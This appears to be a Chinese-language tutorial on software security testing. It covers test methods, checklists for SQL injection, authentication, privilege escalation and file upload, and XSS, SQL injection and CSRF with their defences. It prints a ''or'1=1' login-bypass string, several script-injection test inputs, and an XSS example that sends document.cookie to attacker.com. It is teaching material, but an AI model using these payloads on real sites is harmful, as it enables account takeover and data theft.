## 安全测试



### 一.背景介绍

安全测试是一种确保软件系统或网络安全性能的测试方法。它旨在发现潜在的安全漏洞，以便在实际部署之前修复它们。安全测试的目的是确保系统能够保护数据和资源，并防止未经授权的访问。

安全测试的主要方法包括白盒测试、黑盒测试、静态分析和动态分析。这些方法可以帮助发现潜在的安全漏洞，如缓冲区溢出、SQL注入、跨站请求伪造等。

在本文中，我们将讨论安全测试的常见方法和工具，以及它们如何帮助确保系统的安全性。

### 二.核心概念与联系

#### 2.1 安全测试的类型

安全测试可以分为以下几类：

**静态应用安全测试(SAST)**：在代码编写阶段进行，通过静态分析工具对源代码进行扫描，以检测潜在的安全漏洞。

**动态应用安全测试(DAST)**：在代码运行阶段进行，通过动态分析工具对程序的运行过程进行监控，以检测潜在的安全漏洞。

**基于黑盒的安全测试**：测试对象是不透明的，通过对输入输出关系进行分析，以检测潜在的安全漏洞。

**基于白盒的安全测试**：测试对象是透明的，通过对源代码进行分析，以检测潜在的安全漏洞。

#### 2.2 安全测试的目标

安全测试的主要目标是确保系统的安全性，包括：

**保护数据**：确保数据不被未经授权的访问、篡改或泄露。

**保护资源**：确保系统资源(如计算资源、网络资源等)不被未经授权的访问或使用。

**防止攻击**：确保系统能够防止各种攻击，如DoS攻击、DDoS攻击等。

#### 2.3 安全测试的范围

安全测试的范围包括：

**应用层安全测试**：测试应用程序的安全性，如检测潜在的SQL注入、跨站请求伪造等安全漏洞。

**网络层安全测试**：测试网络设备和通信安全性，如检测潜在的DoS攻击、DDoS攻击等。

**操作系统层安全测试**：测试操作系统的安全性，如检测潜在的缓冲区溢出、文件权限问题等。





### 三、常见测试方法



#### 1.功能测试

采用软件测试中的黑盒测试方法，对涉及安全的软件功能，如用户管理模块、权限管理模块、加密系统、认证系统等进行测试，主要是验证各个模块功能是否有效。

#### 2.漏洞扫描

借助于特定的漏洞扫描工具，能够发现所维护信息系统存在的安全漏洞，为信息系统网络安全防护做到有的放矢，及时修补漏洞。

#### 3.模拟gj实验

以模拟gj来验证软件或者信息系统的安全防护能力。

#### 4.静态代码检查

通过代码走读的方式对源代码的安全性进行测试，常用的代码检查方法有：数据流、控制流、信息流等，通过这些测试方法与安全规则库进行匹配，进而发现潜在的安全漏洞。静态代码检查主要在编码阶段进行测试，尽可能早地发现安全性问题。

#### 5.动态st测试

借助工具或者手工模拟黑客的输入，对应用程序进行安全测试，进而发现系统中的安全性问题。动态st测试一般在系统测试阶段进行。

#### 6.数据扫描

主要是对内存进行测试，尽量发现诸如缓冲区溢出之类的漏洞。



### 二、SQL注入



![image-20240827105311299](https://longhaotuchuang.oss-cn-beijing.aliyuncs.com/img/202408271053360.png)

SQL注入是一种常见的网络gj技术，通过利用应用程序在构建SQL查询时的漏洞进行gj。这些漏洞通常是由于应用程序没有正确验证用户输入或者没有适当地转义用户输入导致的。举个例子：一个登录页面输入用户名和密码，用户名输入框直接输入'or'1=1时，查询SQL就变成了select *from sys_user where username=''or'1=1';这将返回所有的用户记录，从而跳过了用户名的验证，实现了入侵。

为了防止SQL注入gj，应该采取以下措施：

#### 1.验证用户输入

对于任何用户输入，应该使用合适的验证技术来确保输入的有效性和安全性。例如，可以使用正则表达式或者启发方式来检测可能的恶意输入。

#### 2.参数化查询

使用参数化查询或预编译语句来构建SQL查询。这样可以确保用户输入被视为数据而不是SQL代码的一部分，从而防止gj者注入恶意的SQL代码。

#### 3.转义用户输入

对于任何用户输入，应该使用适当的转义技术来转义特殊字符。例如，可以使用MySQL的‘mysqli_real_escape_string’函数来转义字符串中的特殊字符。

#### 4.限制数据库权限

应该将应用程序连接到的数据库的权限限制到最低限速。例如，可以为应用程序创建一个只拥有读取数据的用户账号，从而限制gj者可以执行的操作。

#### 5.安全更新

定期更新应用程序和数据库软件的安全补丁，以确保系统免受已知漏洞的gj。



### 三、用户认证安全

#### 1.不同用户权限

确保系统能够明确区分不同用户的权限。

#### 2.用户冲突

检查系统中是否存在用户冲突的问题。

#### 3.用户权限改变

检查系统是否因为用户权限的改变而造成混乱。

#### 4.登陆密码安全性

检查用户的登录密码是否可见（接口传参时要加密传输）、可复制。

#### 5.绝对路径登录

检查系统是否存在通过绝对路径登录的问题，如：直接拷贝已登录系统的连接，应默认跳转到登录页面，限制直接查看。

#### 6.退出系统

检查用户退出登录系统后，是否删除了所有鉴权标记，并无法通过后退键再次直接进入系统。



### 四、数据库安全

#### 1.数据泄密

数据库中的敏感数据需要加密显示（尤其是银行系统、保密系统等，一般有账号密码、银行卡号等等）。

#### 2.入侵和恶意gj

黑客和恶意内部人员可能试图访问或者篡改数据库中的数据。因此，需要实施强大的访问控制策略，并使用防火墙、入侵检测和响应以及加密等技术来保护数据库。

#### 3.数据备份与恢复

必须制定数据库备份和恢复计划，以防止数据丢失和灾难性事件，主要包括：定期备份数据、测试备份的完整性和可用性，以及在需要时快速恢复数据等。



### 五、系统网络安全

#### 1.漏洞扫描工具

基于漏洞数据库，使用漏洞扫描工具对指定的远程或者本地计算机系统的安全脆弱性进行检测。通过漏洞扫描技术，测评人员能够检测主机是否开放了不必要的服务，是否对外部的网络探测行为进行了有效的屏蔽，是否设置了安全策略避免自身的敏感信息外协，是否安装了存在严重安全隐患的操作系统版本等等。常见的主流漏洞扫描工具和商业化产品有：Nessus、Acunetix WVS 、APPscan、极光、榕基等。

#### 2.网络及应用系统扫描

有助于帮助用户了解网络的安全设置和与运行的应用服务，及时发现安全漏洞，客观评估风险等级，同时还能根据扫描的结果修正安全漏洞和系统中的不合理设置。



### 六、登录安全的其他问题

登录安全测试除了SQL注入外，需要覆盖各其他各个方面，来确保系统的安全性满足要求。

#### 1.连续失败后的处理策略

如：连续登陆失败3次，是否会锁定账号一段时间，或者进行其他有效的防护措施，以防暴力pj。

#### 2.用户登录密码

密码是否可见，以及是否有密码过期策略。密码是否按照符合要求的加密算法进行加密，并且不能以明文方式传输。日志中和数据库中，密码都应限制以明文密码存储。

#### 3.验证码

验证码的失效时间验证。

#### 4.页面超时

验证页面的超时机制，防止长时间无操作导致的会话劫持等一系列风险。

#### 5.cookie存储

检查cookie中是否保存用户名和密码，若保存，则需要加密存储，以保护用户的数据安全。

#### 6.https协议

对于安全性要求高的系统，最好使用https协议进行加密传输。



### 七、越权问题

越权问题是一种常见的网络安全挑战，可以发生在任何有权限管理的系统中。在测试越权问题时，从以下两个方向来验证：

#### 1.未授权访问

不登陆用户账号，直接访问要测试的功能模块（正常的场景是需要登录成功后才能访问），如果能正常访问，则说明存在漏洞。

#### 2.修改参数

例如：A账号的个人资料ID为1，B账号的个人资料ID为2，登录B账号，直接把URL的ID修改为1，如果可以查看到A的个人资料，说明存在越权漏洞。类似于其他参数也可以按照类似方法，查看URL的get参数对那些类似明显的顺序数字，直接修改，查看是否能越权访问。



### 八、页面权限泄漏

同第七项中的未授权访问，把后台目录的URL全部测试一遍，不登陆直接访问的情况即可。



### 九、HTML注入

HTML注入，也被称为虚拟污染，当网站接收到的HTML没有进行合适的处理时，gj者可以通过注入恶意的HTML代码改变网页的内容。

例如：

　

```html
　  1.输入<html”>”gfhd</html>,看是否出错；

　　2.输入<input type=”text” name=”user” οnclick="alert(1)"/>,看是否出现文本框；

　　3.输入<script type="text/javascript">alert(“提示”)</script>看是否出现提示。

　　4.输入”><script type="text/javascript">alert(“提示”)</script>看是否出现提示。

　　5.输入 ”><script><” 看是否出现代码溢出。
```



### 十、文件下载



#### 1.权限限制

如果有下载权限，确认权限限制是否正确。例如，用户未登录时，是否禁止用户下载。

#### 2.删除参数

查看文件是否支持删除，如果可删除，查看删除的URL里面的参数是否可以修改。如果直接修改删除参数，是否能越权删除其他文件。



### 十一、上传文件



#### 1.文件格式

上传的文件格式是否符合规定要求的格式，如是否可以上传.exe文件和.zip文件等。

限制这类文件格式是因为这类可执行文件格式存在安全风险。如常见的bd和mm程序经常以.exe文件的形式存在，对于一些恶意软件的可执行文件，如果不进行限制，就可能在用户不知情的情况下被上传和执行，进而造成系统被gj、数据泄漏等严重后果。此外，从技术角度来说，.exe文件是基于Windows或其他操作系统的一种可执行文件格式，其包含的内容可能对系统产生影响。因此，有必要限制这些格式的上传，用以保护用户和系统的安全。

#### 2.文件大小

文件大小是否满足系统设置的大小显示，需测试最小值与最大值。如，上传0KB的文件是否会导致异常错误，上传超限过大文件是否有错误提示且页面无异常。

#### 3.文件名

文件名是否符合系统设定的命名规则，如是否包含特殊字符。

#### 4.文件内容

上传的文件中存在恶意代码、bd等，上传时是否会检测到。

#### 5.用户权限

操作上传文件，需要校验用户是否有上传文件的权限。测试已上传的文件是否能够被系统正确地访问和控制，如是否只有授权用户才能访问和下载。

#### 6.上传空间

上传空间是否有限制，上传的文件大于服务器剩余上传空间限制时，是否会将大文件拆分上传，是否会出现异常错误。

#### 7.上传成功的判断

上传过程中，网络异常或者中断服务等导致文件上传异常中断，程序是否能判断文件上传是否成功。

#### 8.日志记录

测试上传文件的日志记录是否完整，日志信息是否记录全，涉及的敏感信息是否有加密或隐藏显示。
   





### 十二、安全用例

安全测试通常包含多个安全用例，以下是部分常见用例：

- **漏洞扫描**：对系统的URL、开放的端口、服务和存在的漏洞进行扫描。
- **明文传输**：检查系统传输过程中的敏感内容是否为明文，确保敏感信息如登录密码、支付金额等通过加密方式传输。
- **越权访问**：测试能否通过URL地址获取管理员及其他用户信息，包括垂直越权和水平越权场景。
- **反射性跨站脚本（XSS）**：测试系统是否对输入进行过滤或转移，防止跨站脚本攻击。
- **越权文件下载**：测试URL中是否包含文件名或文件目录，尝试下载或读取其他目录的文件内容。
- **文件上传**：测试能否上传木马、病毒、色情图片等恶意文件。
- **短信**、**邮箱验证**：测试短信、邮箱验证方式是否安全，防止验证码泄露或被绕过。
- **鉴权缺失**：测试需要登录、鉴权才可操作的系统中可修改资源的接口，鉴权是否可靠。
- **密码健壮性**：测试密码、验证码验证的方式是否可靠，防止被暴力猜测。
- **数据安全**：检查系统中敏感数据的存储是否安全，如密码、身份证、银行卡号等。



### 十三、常用安全工具

在安全测试过程中，会使用到多种安全工具来辅助发现和解决安全问题，以下是一些常用工具：

- Wireshark：网络封包分析软件，用于截取网络封包并显示详细的网络封包资料。

- Metasploit：免费的框架，附带数百个已知软件漏洞的专业级漏洞攻击工具，用于漏洞利用和渗透测试。

- Nmap：网络扫描和主机检测工具，可用于信息收集、漏洞探测和安全扫描。

- Nessus：系统漏洞扫描与分析软件，广泛用于扫描和评估系统安全性。

- AppScan：IBM公司的Web应用安全测试工具，采用黑盒测试方式扫描常见的Web应用安全漏洞。

- OWASP ZAP：WEB渗透测试工具，具有代理截包、重放、爬虫、主动扫描等功能。

- BurpSuite：Web应用程序渗透测试的集成平台，包含代理、扫描、攻击等多种工具。

- Snort：开源入侵防御系统（IPS），使用规则定义恶意网络活动并查找匹配的数据包。









## sql注入、XSS攻击、CSRF攻击





### 1、XSS攻击（跨站脚本攻击，Cross-Site Scripting）

**业务场景：**

- 用户在不安全的网站上输入数据（如留言板、搜索框等）。

- 攻击者在这些输入中嵌入恶意脚本（通常是JavaScript）。
- 当其他用户浏览这些页面时，恶意脚本在用户的浏览器中执行。



​     **注意事项**：

- 对所有用户输入进行验证、过滤和转义，特别是对输出到HTML、JavaScript或URL中的字符。
- 使用内容安全策略（CSP）来限制网页可以加载哪些资源。
- 对于用户生成的内容，确保在显示之前进行适当的清理和转义。



**示例模拟：XSS攻击**

*场景描述*：假设有一个简单的留言板应用，用户可以提交留言，并且留言会立即显示在页面上供其他用户查看。

XSS攻击步骤：

> - 攻击者发现留言板没有对用户输入进行适当的处理。
>
> - 攻击者在留言框中输入以下恶意JavaScript代码：
> - 攻击者提交留言。
> - 当其他用户查看留言板时，恶意脚本在他们的浏览器中执行，弹出警告框，并发送用户cookies到攻击者的服务器。

   

```html
 <script>
       alert('XSS攻击成功！');
       document.location.href = 'http://attacker.com/?data=' + document.cookie;
    </script>
```



 **解决方案**

 1、输入验证

> ​             对用户输入进行验证，拒绝任何不符合预期格式的输入。

 2、输出编码

> ​            在将用户输入的数据展示在页面上时，进行HTML编码。例如，将<转换为<，>转换为>等。



示例代码：

```html
function encodeHTML(str) {
   return str.replace(/&/g, '&amp;')
             .replace(/</g, '&lt;')
             .replace(/>/g, '&gt;')
             .replace(/"/g, '&quot;')
             .replace(/'/g, '&#39;');
}
// 使用encodeHTML函数对用户输入进行编码
var userComment = encodeHTML(用户的输入);
document.getElementById('comments').innerHTML = userComment;
```

 3、使用内容安全策略（CSP）

> ​        通过HTTP头部设置CSP，限制可以执行的脚本。
> 

```html
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
```




4、避免直接内联脚本

> 尽量避免在HTML中直接内联JavaScript代码，而是通过外部文件引入。

5、使用安全的库和框架

> 使用已经内置了XSS防护的前端框架和库，如React、Vue或Angular，它们通常会自动对属性值进行编码。

6、定期安全审计

> 对Web应用进行定期的安全审计，以发现和修复潜在的安全漏洞。



### 2、SQL注入攻击





**业务场景：**

- 应用程序使用用户输入来构建SQL查询，而没有进行适当的处理。
- 攻击者在输入中注入恶意SQL代码。
- 这些恶意SQL代码被当作正常的数据库查询执行，导致数据泄露、数据篡改或数据库服务中断。

**注意事项**：

- 使用参数化查询或预编译语句来避免SQL注入。
- 对所有输入数据进行验证和清理，确保它们符合预期的格式。
- 对敏感数据使用加密存储，并限制数据库权限，避免使用数据库的高权限账号处理用户输入。





### 3、CSRF攻击

**场景描述**：

假设我们有一个基于Java的Web应用程序，它允许用户通过一个表单来更新他们的个人信息。



**原始的HTML表单**：

<!-- 假设这是一个用户设置页面 -->

<form action="/update-profile" method="POST">
  <input type="hidden" name="user_id" value="user_input">
  <input type="text" name="email" placeholder="Email" required>
  <input type="text" name="phone" placeholder="Phone" required>
  <input type="submit" value="Update Profile">
</form>

在这种情况下，如果user_id字段可以被攻击者控制，他们可以创建一个隐藏表单的恶意网站或HTML邮件，该表单提交到上述URL，并且user_id设置为攻击者想要的目标用户ID。



**CSRF攻击步骤：**



- 攻击者创建一个恶意的HTML页面，包含上述表单，并将user_id设置为攻击者想要的目标用户ID。

- 受害者在不知情的情况下访问了这个恶意页面。
- 浏览器向/update-profile发送POST请求，包含了受害者的会话cookie和攻击者设置的user_id。
- 服务器接收到请求，并认为是受害者的合法操作，执行了更新操作。



**解决方案**



1、使用CSRF令牌
在表单中添加一个CSRF令牌，这个令牌是服务器生成的，并且在用户的会话中存储一个对应的值。

Java Servlet示例：

```java
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    // 从会话中获取CSRF令牌
    String serverToken = (String) request.getSession().getAttribute("CSRF_TOKEN");
    // 从表单中获取客户端提交的CSRF令牌
    String clientToken = request.getParameter("csrf_token");

    // 验证令牌
    if (serverToken != null && serverToken.equals(clientToken)) {
        // 令牌匹配，继续处理表单
        // 更新用户信息的代码...
    } else {
        // 令牌不匹配，可能是CSRF攻击
        response.sendError(HttpServletResponse.SC_FORBIDDEN);
    }
}
```


HTML表单中添加CSRF令牌：

<form action="/update-profile" method="POST">
  <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}">
  <!-- 其他表单项 -->
  <input type="submit" value="Update Profile">
</form>

在Java Servlet中生成令牌并设置到会话中：

```java
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    // 如果会话中没有CSRF令牌，则创建一个
    if (request.getSession().getAttribute("CSRF_TOKEN") == null) {
        UUID token = UUID.randomUUID();
        request.getSession().setAttribute("CSRF_TOKEN", token.toString());
    }
    // 转发到显示表单的页面
    // request.getRequestDispatcher("/form-page.jsp").forward(request, response);
}
```


2、检查Referer头
服务器可以检查HTTP请求的Referer头，以确保请求是从同一个域发起的。

3、使用SameSite Cookie属性
为Cookie设置SameSite属性，限制Cookie在跨站请求时被发送。

4、双重Cookie验证
在某些场景下，可以通过双重Cookie验证来增加安全性，即在表单提交时同时检查请求中的Cookie和请求体中的Cookie。

5、使用现代Web框架
使用Spring Security等现代Web安全框架，它们提供了CSRF保护的功能。

通过实施上述措施，可以有效地防止CSRF攻击，保护Web应用程序的安全。





#### **防御策略**

- 输入验证：始终验证用户输入，确保它们不包含恶意代码。
- 输出编码：在将用户输入的数据展示在页面上时，进行HTML编码或其他适当的编码。
- 使用安全编程实践：遵循安全编码的最佳实践，如使用安全的API和库。
- 错误处理：不要在生产环境中显示详细的错误信息，这可能会暴露系统信息给攻击者。
- 安全意识教育：提高开发者和用户对网络安全威胁的认识，了解常见的攻击手段和防御措施。





​                     













































